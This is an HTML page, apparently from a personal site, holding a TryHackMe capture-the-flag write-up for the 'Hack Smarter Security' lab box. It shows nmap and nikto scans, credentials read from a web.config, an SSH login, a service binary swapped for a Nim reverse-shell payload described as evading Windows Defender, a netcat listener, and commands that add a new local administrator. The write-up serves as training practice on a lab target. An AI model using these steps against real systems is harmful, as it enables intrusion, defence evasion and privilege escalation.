@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack Smarter Security | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2024-12-30</span>
+                <span>// ID: REF-Hack Smarter Security</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Hack Smarter Security</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme, ctf -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<pre class="codehilite"><code>21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
+|_06-28-23  03:00PM              1022126 stolen-passport.png
+22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
+|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
+|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=hack.thm
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://hack.thm:80/contact.html
+|     Form id: 
+|_    Form action: 
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-fileupload-exploiter: 
+|   
+|     Couldn't find a file-type field.
+|   
+|     Couldn't find a file-type field.
+|   
+|     Couldn't find a file-type field.
+|   
+|     Couldn't find a file-type field.
+|   
+|     Couldn't find a file-type field.
+|   
+|_    Couldn't find a file-type field.
+|_http-server-header: Microsoft-IIS/10.0
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_http-title: HackSmarterSec
+1311/tcp open  ssl/rxmon?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Strict-Transport-Security: max-age=0
+|     X-Frame-Options: SAMEORIGIN
+|     X-Content-Type-Options: nosniff
+|     X-XSS-Protection: 1; mode=block
+|     vary: accept-encoding
+|     Content-Type: text/html;charset=UTF-8
+|     Date: Sat, 08 Nov 2025 10:57:45 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;META http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+|     &lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
+|     &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;/oma/css/loginmaster.css&quot;&gt;
+|     &lt;style type=&quot;text/css&quot;&gt;&lt;/style&gt;
+|     &lt;script type=&quot;text/javascript&quot; src=&quot;/oma/js/prototype.js&quot; language=&quot;javascript&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/oma/js/gnavbar.js&quot; language=&quot;javascript&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/oma/js/Clarity.js&quot; language=&quot;javascript&quot;&gt;&lt;/script&gt;&lt;script language=&quot;javascript&quot;&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Strict-Transport-Security: max-age=0
+|     X-Frame-Options: SAMEORIGIN
+|     X-Content-Type-Options: nosniff
+|     X-XSS-Protection: 1; mode=block
+|     vary: accept-encoding
+|     Content-Type: text/html;charset=UTF-8
+|     Date: Sat, 08 Nov 2025 10:57:56 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;META http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+|     &lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
+|     &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;/oma/css/loginmaster.css&quot;&gt;
+|     &lt;style type=&quot;text/css&quot;&gt;&lt;/style&gt;
+|_    &lt;script type=&quot;text/javascript&quot; src=&quot;/oma/js/prototype.js&quot; language=&quot;javascript&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/oma/js/gnavbar.js&quot; language=&quot;javascript&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/oma/js/Clarity.js&quot; language=&quot;javascript&quot;&gt;&lt;/script&gt;&lt;script language=&quot;javascript&quot;&gt;
+| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
+| Not valid before: 2023-06-30T19:03:17
+|_Not valid after:  2025-06-29T19:03:17
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=hacksmartersec
+| Not valid before: 2025-11-07T10:54:28
+|_Not valid after:  2026-05-09T10:54:28
+|_ssl-date: 2025-11-08T11:26:31+00:00; -1s from scanner time.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1311-TCP:V=7.95%T=SSL%I=7%D=11/8%Time=690F222A%P=x86_64-pc-linux-gn
+SF:u%r(GetRequest,1089,&quot;HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:
+SF:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Optio
+SF:ns:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20acc
+SF:ept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Sa
+SF:t,\x2008\x20Nov\x202025\x2010:57:45\x20GMT\r\nConnection:\x20close\r\n\
+SF:r\n&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20XHTML\x201\.0\x20Str
+SF:ict//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\&quot;&gt;\
+SF:r\n&lt;html&gt;\r\n&lt;head&gt;\r\n&lt;META\x20http-equiv=\&quot;Content-Type\&quot;\x20content=
+SF:\&quot;text/html;\x20charset=UTF-8\&quot;&gt;\r\n&lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;\r\
+SF:n&lt;link\x20type=\&quot;text/css\&quot;\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/oma/css/lo
+SF:ginmaster\.css\&quot;&gt;\r\n&lt;style\x20type=\&quot;text/css\&quot;&gt;&lt;/style&gt;\r\n&lt;script\x2
+SF:0type=\&quot;text/javascript\&quot;\x20src=\&quot;/oma/js/prototype\.js\&quot;\x20language=
+SF:\&quot;javascript\&quot;&gt;&lt;/script&gt;&lt;script\x20type=\&quot;text/javascript\&quot;\x20src=\&quot;/o
+SF:ma/js/gnavbar\.js\&quot;\x20language=\&quot;javascript\&quot;&gt;&lt;/script&gt;&lt;script\x20type
+SF:=\&quot;text/javascript\&quot;\x20src=\&quot;/oma/js/Clarity\.js\&quot;\x20language=\&quot;javas
+SF:cript\&quot;&gt;&lt;/script&gt;&lt;script\x20language=\&quot;javascript\&quot;&gt;\r\n\x20&quot;)%r(HTTPOp
+SF:tions,1089,&quot;HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20max-a
+SF:ge=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x20no
+SF:sniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-encod
+SF:ing\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Sat,\x2008\
+SF:x20Nov\x202025\x2010:57:56\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCT
+SF:YPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20XHTML\x201\.0\x20Strict//EN\&quot;
+SF:\x20\&quot;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\&quot;&gt;\r\n&lt;html&gt;
+SF:\r\n&lt;head&gt;\r\n&lt;META\x20http-equiv=\&quot;Content-Type\&quot;\x20content=\&quot;text/ht
+SF:ml;\x20charset=UTF-8\&quot;&gt;\r\n&lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;\r\n&lt;link\x2
+SF:0type=\&quot;text/css\&quot;\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/oma/css/loginmaster
+SF:\.css\&quot;&gt;\r\n&lt;style\x20type=\&quot;text/css\&quot;&gt;&lt;/style&gt;\r\n&lt;script\x20type=\&quot;t
+SF:ext/javascript\&quot;\x20src=\&quot;/oma/js/prototype\.js\&quot;\x20language=\&quot;javascr
+SF:ipt\&quot;&gt;&lt;/script&gt;&lt;script\x20type=\&quot;text/javascript\&quot;\x20src=\&quot;/oma/js/gna
+SF:vbar\.js\&quot;\x20language=\&quot;javascript\&quot;&gt;&lt;/script&gt;&lt;script\x20type=\&quot;text/j
+SF:avascript\&quot;\x20src=\&quot;/oma/js/Clarity\.js\&quot;\x20language=\&quot;javascript\&quot;&gt;&lt;
+SF:/script&gt;&lt;script\x20language=\&quot;javascript\&quot;&gt;\r\n\x20&quot;);
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+
+<pre class="codehilite"><code>nikto -url http://hack.thm
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.201.107.42
++ Target Hostname:    hack.thm
++ Target Port:        80
++ Start Time:         2025-11-08 06:11:08 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/10.0
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+</code></pre>
+
+<pre class="codehilite"><code>file &gt; \inetpub\wwwroot\hacksmartersec\web.config
+Reading contents of \inetpub\wwwroot\hacksmartersec\web.config:
+&lt;configuration&gt;
+  &lt;appSettings&gt;
+    &lt;add key=&quot;Username&quot; value=&quot;tyler&quot; /&gt;
+    &lt;add key=&quot;Password&quot; value=&quot;IAmA1337h4x0randIkn0wit!&quot; /&gt;
+  &lt;/appSettings&gt;
+  &lt;location path=&quot;web.config&quot;&gt;
+    &lt;system.webServer&gt;
+      &lt;security&gt;
+        &lt;authorization&gt;
+          &lt;deny users=&quot;*&quot; /&gt;
+        &lt;/authorization&gt;
+      &lt;/security&gt;
+    &lt;/system.webServer&gt;
+  &lt;/location&gt;
+&lt;/configuration&gt;
+</code></pre>
+
+<pre class="codehilite"><code>└─$ ssh tyler@10.201.107.42
+The authenticity of host '10.201.107.42 (10.201.107.42)' can't be established.
+ED25519 key fingerprint is SHA256:MvevGrInODrfb/nv+rYdT743Q0BOkhOmNo5qlrhXCUg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.201.107.42' (ED25519) to the list of known hosts.
+tyler@10.201.107.42's password: 
+</code></pre>
+
+<blockquote>
+<p>after success I  go into Desktop path found user.txt</p>
+</blockquote>
+<pre class="codehilite"><code>tyler@HACKSMARTERSEC C:\Users\tyler\Desktop&gt;dir 
+ Volume in drive C has no label. 
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\tyler\Desktop
+
+06/30/2023  07:12 PM    &lt;DIR&gt;          .
+06/30/2023  07:12 PM    &lt;DIR&gt;          ..
+06/21/2016  03:36 PM               527 EC2 Feedback.website
+06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
+06/27/2023  09:42 AM                25 user.txt
+               3 File(s)          1,106 bytes
+               2 Dir(s)  14,088,474,624 bytes free
+
+
+tyler@HACKSMARTERSEC C:\Users\tyler\Desktop&gt;type user.txtr 
+The system cannot find the file specified. 
+
+tyler@HACKSMARTERSEC C:\Users\tyler\Desktop&gt;type user.txt
+</code></pre>
+
+<pre class="codehilite"><code>PS C:\OpenManage&gt; sc.exe qc spoofer-scheduler
+[SC] QueryServiceConfig SUCCESS 
+
+SERVICE_NAME: spoofer-scheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Spoofer Scheduler
+        DEPENDENCIES       : tcpip
+        SERVICE_START_NAME : LocalSystem
+PS C:\OpenManage&gt;
+</code></pre>
+
+<pre class="codehilite"><code>     53       7     1596       4440              4040   0 spoofer-scheduler  
+</code></pre>
+
+<blockquote>
+<p>use nim payload to bypass windows defender</p>
+</blockquote>
+<pre class="codehilite"><code>nim C -d:mingw --app:gui --opt:speed -o:spoofer-scheduler.exe rev.nim
+</code></pre>
+
+<blockquote>
+<p>get that to victim machine and start so can get another reverse shell with administrators privisec</p>
+</blockquote>
+<pre class="codehilite"><code>└─$ nc -nvlp 8080                               
+listening on [any] 8080 ...
+connect to [10.21.16.42] from (UNKNOWN) [10.201.
+C:\Windows\system32&gt; net user luke P@ssw0rd!123 
+net localgroup &quot;Administrators&quot; luke /addThe comy.
+
+
+C:\Windows\system32&gt; The command completed succe
+
+C:\Windows\system32&gt;
+</code></pre>
+
+<blockquote>
+<p>after adding usr to that administrators group login wia ssh and get txt</p>
+</blockquote>
+<pre class="codehilite"><code>PS C:\Users\Administrator&gt; cd Desktop
+PS C:\Users\Administrator\Desktop&gt; ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        6/30/2023   6:40 PM                Hacking-Targets
+-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
+-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
+
+
+PS C:\Users\Administrator\Desktop&gt; cd Hacking-Targets
+PS C:\Users\Administrator\Desktop\Hacking-Targets&gt; ls
+
+
+    Directory: C:\Users\Administrator\Desktop\Hacking-Targets
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/27/2023   9:40 AM             53 hacking-targets.txt
+
+
+PS C:\Users\Administrator\Desktop\Hacking-Targets&gt; cat hacking-targets.txt
+</code></pre>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
